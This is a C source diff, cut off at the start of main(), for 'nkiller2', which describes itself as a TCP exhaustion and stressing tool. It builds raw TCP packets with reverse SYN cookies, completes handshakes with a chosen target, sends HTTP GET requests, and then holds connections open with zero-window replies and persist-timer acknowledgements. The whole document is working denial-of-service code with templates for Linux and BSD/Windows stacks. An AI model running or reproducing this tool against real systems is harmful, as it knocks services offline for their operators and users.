+static void usage(void);
+static void help(void);
+static void *xcalloc(size_t nelem, size_t size);
+static void *xmalloc(size_t size);
+static void *xrealloc(void *ptr, size_t size);
+
+/* port-handling functions */
+static void port_add(HostInfo *Target, uint16_t port);
+static void port_remove(HostInfo *Target, uint16_t port);
+static int port_exists(HostInfo *Target, uint16_t port);
+static uint16_t port_get_random(HostInfo *Target);
+static uint16_t *port_parse(char *portarg, unsigned int *portlen);
+
+/* packet helper functions */
+static uint16_t checksum_comp(uint16_t *addr, int len);
+static void handle_payloads(HostInfo *Target);
+static uint32_t calc_cookie(Sock *sockinfo);
+static char *build_mss(char **tcpopt, unsigned int *tcpopt_len,
+    uint16_t mss);
+static int get_timestamp(const struct tcphdr *tcp, uint32_t *tsval,
+    uint32_t *tsecr);
+static char *build_timestamp(char **tcpopt, unsigned int *tcpopt_len,
+    uint32_t tsval, uint32_t tsecr);
+
+/* sniffing functions */
+static void sniffer_init(HostInfo *Target, SniffInfo *Sniffer);
+static int check_replies(HostInfo *Target, SniffInfo *Sniffer, 
+    u_char **reply);
+
+/* packet handling functions */
+static void send_packet(char* packet, unsigned int *packetlen);
+static void send_syn_probe(HostInfo *Target, SniffInfo *Sniffer);
+static int send_probe(const u_char *reply, HostInfo *Target, int state);
+static char *build_tcpip_packet(const struct in_addr *source,
+    const struct in_addr *target, uint16_t sport, uint16_t dport,
+    uint32_t seq, uint32_t ack, uint8_t ttl, uint16_t ipid,
+    uint16_t window, uint8_t flags, char *data, uint16_t datalen,
+    char *tcpopt, unsigned int tcpopt_len, unsigned int *packetlen);
+
+
+/**** function definitions ****/
+
+
+
+/*
+ * Wrapper around calloc() that calls fatal when out of memory
+ */
+static void *
+xcalloc(size_t nelem, size_t size)
+{
+  void *p;
+
+  p = calloc(nelem, size);
+  if (p == NULL)
+    fatal("Out of memory\n");
+  return p;
+}
+
+
+
+/*
+ * Wrapper around xcalloc() that calls fatal() when out of memory
+ */
+static void *
+xmalloc(size_t size)
+{
+  return xcalloc(1, size);
+}
+
+
+
+static void *
+xrealloc(void *ptr, size_t size)
+{
+  void *p;
+
+  p = realloc(ptr, size);
+  if (p == NULL)
+    fatal("Out of memory\n");
+  return p;
+}
+
+
+
+/*
+ * vararg function called when sth _evil_ happens
+ * usually in conjunction with __func__ to note
+ * which function caused the RIP stat
+ */
+static void
+fatal(const char *fmt, ...)
+{
+  va_list ap;
+  va_start(ap, fmt);
+  (void) vfprintf(stderr, fmt, ap);
+  va_end(ap);
+  exit(EXIT_FAILURE);
+}
+
+
+
+/* Return network stack template */
+static const char *
+get_template(int template)
+{
+  switch (template) {
+    case T_LINUX:
+      return("Linux");
+    case T_BSDWIN:
+      return("BSD | Windows");
+    default:
+      return("Unknown");
+  }
+}
+
+
+
+/*
+ * Print a short usage summary and exit
+ */
+static void
+usage(void)
+{
+  fprintf(stderr,
+      "nkiller2 [-t addr] [-p ports] [-k key] [-n total probes]\n"
+      "         [-N probes/rnd] [-c msec] [-l payload] [-w path]\n"
+      "         [-s sleep] [-d level] [-r vhost] [-T template]\n"
+      "         [-P probe-interval] [-hvyg]\n"
+      "Please use `-h' for detailed help.\n");
+  exit(EX_USAGE);
+}
+
+
+
+/*
+ * Print detailed help
+ */
+static void
+help(void)
+{
+  static const char *help_message =
+    "Nkiller2 - a TCP exhaustion & stressing tool\n"
+    "\n"
+    "Copyright (c) 2008 ithilgore <ithilgore.ryu.L@gmail.com>\n"
+    "http://sock-raw.org\n"
+    "\n"
+    "Nkiller is free software, covered by the GNU General Public License,"
+    "\nand you are welcome to change it and/or distribute copies of it "
+    "under\ncertain conditions.  See the file `COPYING' in the source\n"
+    "distribution of nkiller for the conditions and terms that it is\n"
+    "distributed under.\n"
+    "\n"
+    "    WARNING:\n"
+    "The authors disclaim any express or implied warranties, including,\n"
+    "but not limited to, the implied warranties of merchantability and\n"
+    "fitness for any particular purpose. In no event shall the authors "
+    "or\ncontributors be liable for any direct, indirect, incidental, "
+    "special,\nexemplary, or consequential damages (including, but not "
+    "limited to,\nprocurement of substitute goods or services; loss of "
+    "use, data, or\nprofits; or business interruption) however caused and"
+    " on any theory\nof liability, whether in contract, strict liability,"
+    " or tort\n(including negligence or otherwise) arising in any way out"
+    " of the use\nof this software, even if advised of the possibility of"
+    " such damage.\n\n"
+    "Usage:\n"
+    "\n"
+    "    nkiller2 -t <target> -p <ports> [options]\n"
+    "\n"
+    "Mandatory:\n"
+    "  -t target          The IP address of the target host.\n"
+    "  -p port[,port]     A list of ports, separated by commas. Specify\n"
+    "                     only ports that are known to be open, or use\n"
+    "                     -y when unsure.\n"
+    "Options:\n"
+    "  -c msec            Time in microseconds, between each pcap poll\n"
+    "                     for packets (pcap poll timeout).\n"
+    "  -d level           Set the debug level (1: some, 2: all)\n"
+    "  -h                 Print this help message.\n"
+    "  -k key             Set the key for reverse SYN cookies.\n"
+    "  -l payload         Additional payload string.\n"
+    "  -s sleep           Average time in ms between each probe.\n"
+    "  -n probes          Set the number of probes, 0 for unlimited.\n"
+    "  -N probes/rnd      Number of probes per round.\n"
+    "  -T template        Attacked network stack template:\n"
+    "                     0. Linux (default)\n"
+    "                     1. *BSD | Windows\n"
+    "  -P time            Number of seconds after which we reply to the\n"
+    "                     persist timer probes.\n"
+    "  -w path            URL or GET request to web server. The path of\n"
+    "                     a big file (> 4K) should work nicely here.\n"
+    "  -r vhost           Virtual host name. This is needed for web\n"
+    "                     hosts that support virtual hosting on HTTP1.1\n"
+    "  -g                 Guardmode. Continue answering to zero probes \n"
+    "                     until the end of times.\n"
+    "  -y                 Dynamic port handling.  Remove ports from the\n"
+    "                     port list if we get an RST for them. Useful\n"
+    "                     when you do not know if one port is open for "
+    "sure.\n"
+    "  -v                 Verbose mode.\n";
+
+  printf("%s", help_message);
+  fflush(stdout);
+}
+
+
+
+/*
+ * Build a TCP packet from its constituents
+ */
+static char *
+build_tcpip_packet(const struct in_addr *source,
+    const struct in_addr *target, uint16_t sport, uint16_t dport,
+    uint32_t seq, uint32_t ack, uint8_t ttl, uint16_t ipid,
+    uint16_t window, uint8_t flags, char *data, uint16_t datalen,
+    char *tcpopt, unsigned int tcpopt_len, unsigned int *packetlen)
+{
+  char *packet;
+  struct ip *ip;
+  struct tcphdr *tcp;
+  pseudo_hdr *phdr;
+  char *tcpdata;
+  /* fake length to account for 16bit word padding chksum */
+  unsigned int chklen;    
+
+  if (tcpopt_len % 4)
+    fatal("TCP option length must be divisible by 4.\n");
+
+  *packetlen = sizeof(*ip) + sizeof(*tcp) + tcpopt_len + datalen;
+  if (*packetlen % 2)
+    chklen = *packetlen + 1;
+  else 
+    chklen = *packetlen;
+
+  packet = xmalloc(chklen + sizeof(*phdr));
+
+  ip = (struct ip *)packet;
+  tcp = (struct tcphdr *) ((char *)ip + sizeof(*ip));
+  tcpdata = (char *) ((char *)tcp + sizeof(*tcp) + tcpopt_len);
+
+  memset(packet, 0, chklen);
+
+  ip->ip_v = 4;
+  ip->ip_hl = 5;
+  ip->ip_tos = 0;
+  ip->ip_len = *packetlen; /* must be in host byte order for FreeBSD */
+  ip->ip_id = htons(ipid); /* kernel will fill with random value if 0 */
+  ip->ip_off = 0;
+  ip->ip_ttl = ttl;
+  ip->ip_p = IPPROTO_TCP;
+  ip->ip_sum = checksum_comp((unsigned short *)ip, sizeof(struct ip));
+  ip->ip_src.s_addr = source->s_addr;
+  ip->ip_dst.s_addr = target->s_addr;
+
+  tcp->th_sport = htons(sport);
+  tcp->th_dport = htons(dport);
+  tcp->th_seq = seq;
+  tcp->th_ack = ack;
+  tcp->th_x2 = 0;
+  tcp->th_off = 5 + (tcpopt_len / 4);
+  tcp->th_flags = flags;
+  tcp->th_win = htons(window);
+  tcp->th_urp = 0;
+
+  memcpy((char *)tcp + sizeof(*tcp), tcpopt, tcpopt_len);
+  memcpy(tcpdata, data, datalen);
+
+  /* pseudo header used for checksumming */
+  phdr = (struct pseudo_hdr *) ((char *)packet + chklen);
+  phdr->src = source->s_addr;
+  phdr->dst = target->s_addr;
+  phdr->mbz = 0;
+  phdr->proto = IPPROTO_TCP;
+  phdr->len = ntohs((tcp->th_off * 4) + datalen);
+  /* tcp checksum */
+  tcp->th_sum = checksum_comp((unsigned short *)tcp,
+      chklen - sizeof(*ip) + sizeof(*phdr));
+
+  return packet;
+}
+
+
+/* 
+ * Write the packet to the network and free it from memory
+ */
+static void
+send_packet(char* packet, unsigned int *packetlen)
+{
+  struct sockaddr_in sin;
+  int sockfd, one;
+
+  sin.sin_family = AF_INET;
+  sin.sin_port = ((struct tcphdr *)(packet + 
+        sizeof(struct ip)))->th_dport;
+  sin.sin_addr.s_addr = ((struct ip *)(packet))->ip_dst.s_addr;
+
+  if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    fatal("cannot open socket");
+
+  one = 1;
+  setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *) &one,
+      sizeof(one));
+
+  if (sendto(sockfd, packet, *packetlen, 0,
+        (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+    fatal("sendto error: ");
+  }
+  close(sockfd);
+  free(packet);
+}
+
+
+/*
+ * Build TCP timestamp option
+ * tcpopt points to possibly already existing TCP options
+ * so inspect current TCP option length (tcpopt_len)
+ */
+static char *
+build_timestamp(char **tcpopt, unsigned int *tcpopt_len,
+    uint32_t tsval, uint32_t tsecr) 
+{
+  struct timeval now;
+  tcp_timestamp t;
+  char *opt;
+
+  if (*tcpopt_len) {
+    opt = xrealloc(*tcpopt, *tcpopt_len + sizeof(t));
+    *tcpopt = opt;
+    opt += *tcpopt_len;
+  } else
+    *tcpopt = xmalloc(sizeof(t));
+
+  memset(&t, TCPOPT_NOP, sizeof(t));
+  t.kind = TCPOPT_TIMESTAMP;
+  t.length = 10;
+  if (gettimeofday(&now, NULL) < 0)
+    fatal("Couldn't get time of day\n");
+  t.tsval = htonl((tsval) ? tsval : (uint32_t)now.tv_sec);
+  t.tsecr = htonl((tsecr) ? tsecr : 0);
+
+  if (*tcpopt_len)
+    memcpy(opt, &t, sizeof(t));
+  else 
+    memcpy(*tcpopt, &t, sizeof(t));
+
+  *tcpopt_len += sizeof(t);
+
+  return *tcpopt;
+}
+
+
+
+/*
+ * Build TCP Maximum Segment Size option
+ */
+static char *
+build_mss(char **tcpopt, unsigned int *tcpopt_len, uint16_t mss)
+{
+  struct tcp_mss t;
+  char *opt;
+
+  if (*tcpopt_len) {
+    opt = realloc(*tcpopt, *tcpopt_len + sizeof(t));
+    *tcpopt = opt;
+    opt += *tcpopt_len;
+  } else
+    *tcpopt = xmalloc(sizeof(t));
+
+  memset(&t, TCPOPT_NOP, sizeof(t));
+  t.kind = TCPOPT_MAXSEG;
+  t.length = 4;
+  t.mss = htons(mss);
+
+  if (*tcpopt_len)
+    memcpy(opt, &t, sizeof(t));
+  else 
+    memcpy(*tcpopt, &t, sizeof(t));
+
+  *tcpopt_len += sizeof(t);
+  return *tcpopt;
+}
+
+
+
+/* 
+ * Perform pcap polling (until a certain timeout) and
+ * return the packet you got - also check that the
+ * packet we get is something we were expecting, according
+ * to the reverse cookie we had set in the tcp seq field.
+ * Returns the virtual state that the reply denotes and which
+ * we differentiate from each other based on packet parsing techniques.
+ */
+static int 
+check_replies(HostInfo *Target, SniffInfo *Sniffer, u_char **reply)
+{
+
+  int timedout = 0;
+  int goodone = 0;
+  const u_char *packet = NULL;
+  uint32_t decoded_seq;
+  uint32_t ack, calc_ack;
+  int state;
+  uint16_t datagram_len;
+  uint32_t datalen;
+  struct Sock sockinfo;
+  struct pcap_pkthdr phead;
+  const struct ip *ip;
+  const struct tcphdr *tcp;
+  struct timeval now, wait;
+  uint32_t tsval, tsecr;
+  uint32_t time_elapsed = 0;
+
+  state = 0;
+
+  if (gettimeofday(&wait, NULL) < 0)
+    fatal("Couldn't get time of day\n");
+  /* poll for 'polltime' micro seconds */
+  wait.tv_usec += o.polltime;
+
+  do {
+    datagram_len = 0;
+    packet = pcap_next(Sniffer->pd, &phead);
+    if (gettimeofday(&now, NULL) < 0)
+      fatal("Couldn't get time of day\n");
+    if (TIMEVAL_SUBTRACT(wait, now) < 0)
+      timedout++;
+
+    if (packet == NULL)
+      continue;
+
+    /* This only works on Ethernet - be warned */
+    if (*(packet + 12) != 0x8) {
+      break; /* not an IPv4 packet */
+    }
+
+    ip = (const struct ip *) (packet + SIZE_ETHERNET);
+
+    /* 
+     * TCP/IP header checking - end cases are more than the ones
+     * checked below but are so rarely happening that for
+     * now we won't go into trouble to validate - could also
+     * use validedpkt() from nmap/tcpip.cc
+     */
+    if (ip->ip_hl < 5) {
+      if (o.debug2)
+        (void) fprintf(stderr, "IP header < 20 bytes\n");
+      break;
+    }
+    if (ip->ip_p != IPPROTO_TCP) {
+      if (o.debug2)
+        (void) fprintf(stderr, "Packet not TCP\n");
+      break;
+    }
+
+    datagram_len = ntohs(ip->ip_len); /* Save length for later */
+
+    tcp = (const void *) ((const char *)ip + ip->ip_hl * 4);
+    if (tcp->th_off < 5) {
+      if (o.debug2)
+        (void) fprintf(stderr, "TCP header < 20 bytes\n");
+      break;
+    }
+
+    datalen = datagram_len - (ip->ip_hl * 4) - (tcp->th_off * 4);
+
+    /* A non-ACK packet is nothing valid */
+    if (!(tcp->th_flags & TH_ACK))
+      break; 
+
+    /* 
+     * We swap the values accordingly since we want to
+     * check the result with the 4tuple we had created
+     * when sending our own syn probe
+     */
+    sockinfo.saddr.s_addr = ip->ip_dst.s_addr;
+    sockinfo.daddr.s_addr = ip->ip_src.s_addr;
+    sockinfo.sport = ntohs(tcp->th_dport);
+    sockinfo.dport = ntohs(tcp->th_sport);
+    decoded_seq = calc_cookie(&sockinfo);
+
+    if (tcp->th_flags & (TH_SYN|TH_RST)) {
+
+      ack = ntohl(tcp->th_ack) - 1;
+      calc_ack = ntohl(decoded_seq);
+      /* 
+       * We can't directly compare two values returned by
+       * the ntohl functions
+       */
+      if (ack != calc_ack)
+        break;
+
+      /* OK we got a reply to something we have sent */
+
+      /* SYNACK case */
+      if (tcp->th_flags & TH_SYN) {
+
+        if (o.dynamic && port_exists(Target, sockinfo.dport)) {
+          if (o.debug2)
+            (void) fprintf(stderr, "Port doesn't exist in list "
+                "- probably removed it before due to an RST and dynamic "
+                "handling\n");
+          break;
+        }
+        if (o.debug)
+          (void) fprintf(stdout,
+              "Got SYN packet with seq: %x our port: %u "
+              "target port: %u\n", decoded_seq,
+              sockinfo.sport, sockinfo.dport);
+
+        goodone++;
+        state = S_SYNACK;
+
+        /* ERR case */
+      } else if (tcp->th_flags & TH_RST) {
+
+        /* 
+         * If we get an RST packet this means that the port is
+         * closed and thus we remove it from our port list.
+         */
+        if (o.debug2)
+          (void) fprintf(stdout,
+              "Oops! Got an RST packet with seq: %x "
+              "port %u is closed\n",decoded_seq,
+              sockinfo.dport);
+        if (o.dynamic)
+          port_remove(Target, sockinfo.dport);
+      } 
+    } else {
+      /* 
+       * Each subsequent ACK that we get will have the
+       * same acknowledgment number since we won't be sending
+       * any more data to the target.
+       */
+      ack = ntohl(tcp->th_ack);
+      calc_ack = ntohl(decoded_seq) + Target->wlen + 1;
+
+      if (ack != calc_ack) 
+        break;
+
+      struct timeval now;
+      if (get_timestamp(tcp, &tsval, &tsecr)) {
+        if (gettimeofday(&now, NULL) < 0)
+          fatal("Couldn't get time of day\n");
+        time_elapsed = now.tv_sec - tsecr;
+        if (o.debug) 
+          (void) fprintf(stdout, "Time elapsed: %u (sport: %u)\n",
+              time_elapsed, sockinfo.sport);
+      } else 
+        (void) fprintf(stdout, "Warning: No timestamp available from "
+            "target host's reply. Chaotic behaviour imminent...\n");
+
+      /* 
+       * First Data Acknowledgment case (FDACK)
+       * Note that this packet may not always appear, since there
+       * is a chance that it will be piggybacked with the first
+       * sending data of the peer, depending on whether the delayed
+       * acknowledgment timer expired or not at the peer side.
+       * Practically, we choose to ignore it and wait until
+       * we receive actual data.
+       */
+      if (ack == calc_ack && (!datalen || datalen == 1)
+          && time_elapsed < o.probe_interval) {
+        state = S_FDACK;
+        break;
+      }
+
+      /* 
+       * Data - victim sent the first packet(s) of data
+       */
+      if (ack == calc_ack && datalen > 1) {
+        if (tcp->th_flags & TH_PUSH) {
+          state = S_DATA_1;
+          goodone++;
+          break;
+        } else {
+          state = S_DATA_0;
+          goodone++;
+          break;
+        }
+      }
+
+      /* 
+       * Persist (Probe) Timer reply
+       * The time_elapsed limit must be at least equal to the product:
+       * ('persist_timer_interval' * '/proc/sys/net/ipv4/tcp_retries2')
+       * or else we might lose an important probe and fail to ack it
+       * On Linux: persist_timer_interval = about 2 minutes (after it has
+       * stabilized) and tcp_retries2 = 15 probes.
+       * Note we check 'datalen' for both 0 and 1 since Linux probes
+       * with 0 data, while *BSD/Windows probe with 1 byte of data
+       */
+      if (ack == calc_ack && (!datalen || datalen == 1) 
+          && time_elapsed >= o.probe_interval) {
+        state = S_PROBE;
+        goodone++;
+        break;
+      }
+
+    }
+
+  } while (!timedout && !goodone);
+
+  if (goodone) {
+    *reply = xmalloc(datagram_len);
+    memcpy(*reply, packet + SIZE_ETHERNET, datagram_len);
+  }
+
+  return state;
+}
+
+
+
+/* 
+ * Parse TCP options and get timestamp if it exists.
+ * Return 1 if timestamp valid, 0 for failure
+ */
+int
+get_timestamp(const struct tcphdr *tcp, uint32_t *tsval, uint32_t *tsecr)
+{
+  u_char *p;
+  unsigned int op;
+  unsigned int oplen;
+  unsigned int len = 0;
+
+  if (!tsval || !tsecr)
+    return 0;
+
+  p = ((u_char *)tcp) + sizeof(*tcp);
+  len = 4 * tcp->th_off - sizeof(*tcp);
+
+  while (len > 0 && *p != TCPOPT_EOL) {
+    op = *p++;
+    if (op == TCPOPT_EOL)
+      break;
+    if (op == TCPOPT_NOP) {
+      len--;
+      continue;
+    }
+    oplen = *p++;
+    if (oplen < 2) 
+      break;
+    if (oplen > len)
+      break; /* not enough space */
+    if (op == TCPOPT_TIMESTAMP && oplen == 10) {
+      /* legitimate timestamp option */
+      if (tsval) { 
+        memcpy((char *)tsval, p, 4); 
+        *tsval = ntohl(*tsval); 
+      }
+      p += 4;
+      if (tsecr) { 
+        memcpy((char *)tsecr, p, 4);
+        *tsecr = ntohl(*tsecr);
+      }
+      return 1;
+    }
+    len -= oplen;
+    p += oplen - 2;
+  }
+  *tsval = 0;
+  *tsecr = 0;
+  return 0;
+}
+
+
+
+/* 
+ * Craft SYN initiating probe
+ */
+static void
+send_syn_probe(HostInfo *Target, SniffInfo *Sniffer)
+{
+  char *packet;
+  char *tcpopt;
+  uint16_t sport, dport;
+  uint32_t encoded_seq;
+  unsigned int packetlen, tcpopt_len;
+  Sock *sockinfo;
+
+  tcpopt_len = 0;
+  sockinfo = xmalloc(sizeof(*sockinfo));
+
+  sport = (1024 + random()) % 65536;
+  dport = port_get_random(Target);
+
+  /* Calculate reverse cookie and encode value into sequence number */
+  sockinfo->saddr.s_addr = Sniffer->saddr.s_addr;
+  sockinfo->daddr.s_addr = Target->daddr.s_addr;
+  sockinfo->sport = sport;
+  sockinfo->dport = dport;
+  encoded_seq = calc_cookie(sockinfo);
+
+  /* Build tcp options - timestamp, mss */
+  tcpopt = build_timestamp(&tcpopt, &tcpopt_len, 0, 0);
+  tcpopt = build_mss(&tcpopt, &tcpopt_len, 1024);
+
+  packet = build_tcpip_packet(
+      &Sniffer->saddr,
+      &Target->daddr,
+      sport,
+      dport,
+      encoded_seq,
+      0,
+      64,
+      random() % (uint16_t)~0,
+      1024,
+      TH_SYN,
+      NULL,
+      0,
+      tcpopt,
+      tcpopt_len,
+      &packetlen
+      );
+
+  send_packet(packet, &packetlen);
+
+  free(tcpopt);
+  free(sockinfo);
+}
+
+
+
+/* 
+ * Generic probe function: depending on the value of 'state' as
+ * denoted by check_replies() earlier, we trigger a different probe
+ * behaviour, taking also into account any network stack templates.
+ */
+static int
+send_probe(const u_char *reply, HostInfo *Target, int state)
+{
+  char *packet;
+  unsigned int packetlen;
+  uint32_t ack;
+  char *tcpopt;
+  unsigned int tcpopt_len;
+  int validstamp;
+  uint32_t tsval, tsecr;
+  struct ip *ip;
+  struct tcphdr *tcp;
+  uint16_t datalen;
+  uint16_t window;
+  int payload = 0;
+
+  validstamp = 0;
+  tcpopt_len = 0;
+
+  ip = (struct ip *)reply;
+  tcp = (struct tcphdr *)((char *)ip + ip->ip_hl * 4);
+  datalen = ntohs(ip->ip_len) - (ip->ip_hl * 4) - (tcp->th_off * 4);
+
+  switch (state) {
+    case S_SYNACK:
+      ack = ntohl(tcp->th_seq) + 1;
+      window = 1024;
+      payload++;
+      break;
+    case S_DATA_0:
+      ack = ntohl(tcp->th_seq) + datalen;
+      if (o.template == T_BSDWIN) 
+        window = 0;
+      else 
+        window = 512;
+      break;
+    case S_DATA_1:
+      ack = ntohl(tcp->th_seq) + datalen;
+      window = 0;
+      break;
+    case S_PROBE:
+      ack = ntohl(tcp->th_seq);
+      window = 0;
+      break;
+    default:    /* we shouldn't get here */
+      ack = ntohl(tcp->th_seq);
+      window = 0;
+      break;
+  }
+
+  if (get_timestamp(tcp, &tsval, &tsecr)) {
+    validstamp++;
+    tcpopt = build_timestamp(&tcpopt, &tcpopt_len, 0, tsval);
+  }
+
+  packet = build_tcpip_packet(
+      &ip->ip_dst,  /* mind the swapping */
+      &ip->ip_src,
+      ntohs(tcp->th_dport),
+      ntohs(tcp->th_sport),
+      tcp->th_ack, /* as seq field */
+      htonl(ack),
+      64,
+      random() % (uint16_t)~0,
+      window,
+      TH_ACK,
+      (payload) ? ((ntohs(tcp->th_sport) == 80) 
+        ? Target->url : Target->payload) : NULL,
+      (payload) ? ((ntohs(tcp->th_sport) == 80) 
+        ? Target->wlen : Target->plen) : 0,
+      (validstamp) ? tcpopt : NULL,
+      (validstamp) ? tcpopt_len : 0,
+      &packetlen
+      );
+
+  send_packet(packet, &packetlen);
+  free(tcpopt);
+
+  return 0;
+}
+
+
+
+/* 
+ * Reverse(or client) syn_cookie function - encode the 4tuple
+ * { src ip, src port, dst ip, dst port } and a secret key into 
+ * the sequence number, thus keeping info of the packet inside itself
+ * (idea taken by scanrand - Nmap uses an equivalent technique too)
+ */
+static uint32_t
+calc_cookie(Sock *sockinfo)
+{
+
+  uint32_t seq;
+  unsigned int cookie_len;
+  unsigned int input_len;
+  unsigned char *input;
+  unsigned char cookie[EVP_MAX_MD_SIZE];
+
+  input_len = sizeof(*sockinfo);
+  input = xmalloc(input_len);
+  memcpy(input, sockinfo, sizeof(*sockinfo));
+
+  /* Calculate a sha1 hash based on the quadruple and the skey */
+  HMAC(EVP_sha1(), (char *)o.skey, strlen(o.skey), input, input_len,
+      cookie, &cookie_len);
+
+  free(input);
+
+  /* Get only the first 32 bits of the sha1 hash */
+  memcpy(&seq, &cookie, sizeof(seq));
+  return seq;
+}
+
+
+
+static void
+sniffer_init(HostInfo *Target, SniffInfo *Sniffer)
+{
+  char errbuf[PCAP_ERRBUF_SIZE];
+  struct bpf_program bpf;
+  struct pcap_addr *address;
+  struct sockaddr_in *ip;
+  char filter[27];
+
+  strncpy(filter, "src host ", sizeof(filter));
+  strncpy(&filter[sizeof("src host ")-1], inet_ntoa(Target->daddr), 16);
+  if (o.debug)
+    (void) fprintf(stdout, "Filter: %s\n", filter);
+
+  if ((pcap_findalldevs(&Sniffer->dev, errbuf)) == -1)
+    fatal("%s: pcap_findalldevs(): %s\n", __func__, errbuf);
+
+  address = Sniffer->dev->addresses; 
+  address = address->next;           /* first address is garbage */    
+
+  if (address->addr) {
+    ip = (struct sockaddr_in *) address->addr;
+    memcpy(&Sniffer->saddr, &ip->sin_addr, sizeof(struct in_addr));
+    if (o.debug) {
+      (void) fprintf(stdout, "Local IP: %s\nDevice name: "
+          "%s\n", inet_ntoa(Sniffer->saddr), Sniffer->dev->name);
+    }
+  } else
+    fatal("%s: Couldn't find associated IP with interface %s\n",
+        __func__, Sniffer->dev->name);
+
+  if (!(Sniffer->pd = 
+        pcap_open_live(Sniffer->dev->name, BUFSIZ, 0, 0, errbuf)))
+    fatal("%s: Could not open device %s: error: %s\n ", __func__,
+        Sniffer->dev->name, errbuf);
+
+  if (pcap_compile(Sniffer->pd , &bpf, filter, 0, 0) == -1)
+    fatal("%s: Couldn't parse filter %s: %s\n ", __func__, filter,
+        pcap_geterr(Sniffer->pd));
+
+  if (pcap_setfilter(Sniffer->pd, &bpf) == -1)
+    fatal("%s: Couldn't install filter %s: %s\n", __func__, filter,
+        pcap_geterr(Sniffer->pd));
+
+  if (pcap_setnonblock(Sniffer->pd, 1, NULL) < 0)
+    fprintf(stderr, "Couldn't set nonblocking mode\n");
+}
+
+
+
+static uint16_t *
+port_parse(char *portarg, unsigned int *portlen)
+{
+  char *endp;
+  uint16_t *ports;
+  unsigned int nports;
+  unsigned long pvalue;
+  char *temp;
+  *portlen = 0;
+
+  ports = xmalloc(65535 * sizeof(uint16_t));
+  nports = 0;
+
+  while (nports < 65535) {
+    if (nports == 0)
+      temp = strtok(portarg, ",");
+    else
+      temp = strtok(NULL, ",");
+
+    if (temp == NULL)
+      break;
+
+    endp = NULL;
+    errno = 0;
+    pvalue = strtoul(temp, &endp, 0);
+    if (errno != 0 || *endp != '\0') {
+      fprintf(stderr, "Invalid port number: %s\n",
+          temp);
+      goto cleanup;
+    }
+
+    if (pvalue > IPPORT_MAX) {
+      fprintf(stderr, "Port number too large: %s\n",
+          temp);
+      goto cleanup;
+    }
+
+    ports[nports++] = (uint16_t)pvalue;
+  }
+  if (portlen != NULL)
+    *portlen = nports;
+  return ports;
+
+cleanup:
+  free(ports);
+  return NULL;
+}
+
+
+
+/*
+ * Check if port is in list, return 0 if it is, -1 if not
+ * (similar to port_remove in logic)
+ */
+static int
+port_exists(HostInfo *Target, uint16_t port)
+{
+  port_elem *current;
+  port_elem *before;
+
+  current = Target->ports.first;
+  before = Target->ports.first;
+
+  while (current->port_val != port && current->next != NULL) {
+    before = current;
+    current = current->next;
+  }
+
+  if (current->port_val != port && current->next == NULL) {
+    if (o.debug2)
+      (void) fprintf(stderr, "%s: port %u doesn't exist in "
+          "list\n", __func__, port);
+    return -1;
+  } else
+    return 0;
+}
+
+
+
+/* 
+ * Remove specific port from portlist
+ */
+static void
+port_remove(HostInfo *Target, uint16_t port)
+{
+  port_elem *current;
+  port_elem *before;
+
+  current = Target->ports.first;
+  before = Target->ports.first;
+
+  while (current->port_val != port && current->next != NULL) {
+    before = current;
+    current = current->next;
+  }
+
+  if (current->port_val != port && current->next == NULL) {
+    if (current != Target->ports.first) {
+      if (o.debug2)
+        (void) fprintf(stderr, "Port %u not found in list\n", port);
+      return;
+    }
+  }
+
+  if (current != Target->ports.first) {
+    before->next = current->next;
+  } else {
+    Target->ports.first = current->next;
+  }
+  Target->portlen--;
+  if (!Target->portlen)
+    fatal("No port left to hit!\n");
+}
+
+
+
+/*
+ * Add new port to port linked list of Target
+ */
+static void
+port_add(HostInfo *Target, uint16_t port)
+{
+  port_elem *current;
+  port_elem *newNode;
+
+  newNode = xmalloc(sizeof(*newNode));
+
+  newNode->port_val = port;
+  newNode->next = NULL;
+
+  if (Target->ports.first == NULL) {
+    Target->ports.first = newNode;
+    Target->ports.last = newNode;
+    return;
+  }
+
+  current = Target->ports.last;
+  current->next = newNode;
+  Target->ports.last = newNode;
+}
+
+
+
+/* 
+ * Return a random port from portlist
+ */
+static uint16_t
+port_get_random(HostInfo *Target)
+{
+  port_elem *temp;
+  unsigned int i, offset;
+
+  temp = Target->ports.first;
+  offset = (random() % Target->portlen);
+  i = 0;
+  while (i < offset) {
+    temp = temp->next;
+    i++;
+  }
+  return temp->port_val;
+}
+
+
+
+/*
+ * Prepare the payload that will be sent in the 3rd phase
+ * of the Connection-estalishment handshake (piggypacked
+ * along with the ACK of the peer's SYNACK)
+ */
+static void
+handle_payloads(HostInfo *Target)
+{
+  if (o.payload[0]) {
+    Target->plen = strlen(o.payload);
+    Target->payload = xmalloc(Target->plen);
+    strncpy(Target->payload, o.payload, Target->plen);
+  } else {
+    Target->payload = NULL;
+    Target->plen = 0;
+  }
+
+  if (o.path[0]) {
+    if (o.vhost[0]) {
+      Target->wlen = strlen(o.path) + strlen(o.vhost) +
+        sizeof("GET  HTTP/1.0\015\012Host: \015\012\015\012") - 1;
+      Target->url = xmalloc(Target->wlen + 1);
+      /* + 1 for trailing '\0' of snprintf()  */
+      snprintf(Target->url, Target->wlen + 1, 
+          "GET %s HTTP/1.0\015\012Host: %s\015\012\015\012",
+          o.path, o.vhost);
+    } else {
+      Target->wlen = strlen(o.path) + 
+        sizeof("GET  HTTP/1.0\015\012\015\012") - 1;
+      Target->url = xmalloc(Target->wlen + 1); 
+      snprintf(Target->url, Target->wlen + 1, 
+          "GET %s HTTP/1.0\015\012\015\012", o.path);
+    }
+  } else {
+    Target->wlen = sizeof(WEB_PAYLOAD) - 1;
+    Target->url = xmalloc(Target->wlen);
+    memcpy(Target->url, WEB_PAYLOAD, Target->wlen);
+  }
+}
+
+
+
+/* No way you have seen this before! */
+static uint16_t
+checksum_comp(uint16_t *addr, int len)
+{
+  register long sum = 0;
+  uint16_t checksum;
+  int count = len;
+  uint16_t temp;
+
+  while (count > 1)  {
+    temp = *addr++;
+    sum += temp;
+    count -= 2;
+  }
+  if (count > 0)
+    sum += *(char *) addr;
+
+  while (sum >> 16)
+    sum = (sum & 0xffff) + (sum >> 16);
+
+  checksum = ~sum;
+  return checksum;
+}
+
+
+
+int
+main(int argc, char **argv)
+{
+  int print_help;
+  int opt;
+  int required;
+  int debug_level;
+  size_t i;
+  unsigned int portlen;
+  unsigned int probes, probes_sent, probes_left;
+  unsigned int probes_this_rnd, probes_rnd_fini;
+  int unlimited, state, probe_byusr;
